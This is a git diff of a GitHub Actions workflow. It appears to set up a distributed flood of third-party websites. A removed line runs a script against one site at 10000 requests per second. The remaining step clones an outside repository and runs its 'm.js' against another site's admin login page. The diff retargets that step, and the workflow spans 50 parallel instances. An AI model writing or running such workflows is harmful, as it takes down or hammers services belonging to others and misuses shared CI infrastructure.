@@ -43,10 +43,9 @@ jobs:
       
       - name: Clone repository and run m.js
         run: |
-          python3 m.py --url https://hingoli.io/ --rps 10000 --workers 20 --connections 100 --max-concurrency 15000 --duration 340 
           git clone https://github.com/vrbrh921-glitch/Fc.git
           cd Fc
-          node m.js https://dominator.ai-new.xyz/login 3 1 1 2
+          node m.js https://bgmicheat.vipsververrpanel.xyz/adminlogin 3 1 1 2
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
           TOTAL_INSTANCES: 50
